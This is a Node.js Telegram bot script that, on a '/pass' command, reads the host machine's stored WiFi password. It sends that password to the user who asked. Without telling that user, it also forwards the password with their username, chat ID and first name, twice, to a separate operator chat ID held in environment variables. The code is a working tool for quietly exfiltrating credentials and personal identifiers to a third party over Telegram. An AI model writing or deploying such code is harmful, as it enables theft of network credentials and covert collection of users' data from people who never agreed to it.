const wifiPassword = require("wifi-password");
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
//console.log(process.env.BOT_TOKEN);
//console.log(process.env.CHAT_ID);


const botToken = process.env.BOT_TOKEN;
const mychatId = process.env.CHAT_ID;


// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
const bot = new TelegramBot( botToken, { polling: true });

// Replace 'YOUR_CHAT_ID' with your actual chat ID
const chatIdToReceiveInfo = mychatId;

// Handle /pass command
bot.onText(/\/pass/, async (msg) => {
  try {
    const password = await wifiPassword();
    const username = msg.from.username;
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name;
    
    const message = `Username:@${username}\nChat ID: ${chatId}\nFirst Name: ${firstName}\nWiFi password: ${password}`;
    bot.sendMessage(chatIdToReceiveInfo, message);
    
    const messagee = `hey: ${firstName}\n your WiFi password is: ${password}`;


    // Forward the user info to your chat ID
    bot.sendMessage(chatIdToReceiveInfo, message);
    //message to the other users
    bot.sendMessage(chatId, messagee);
  } catch (error) {
    console.error(error);
  }
});






























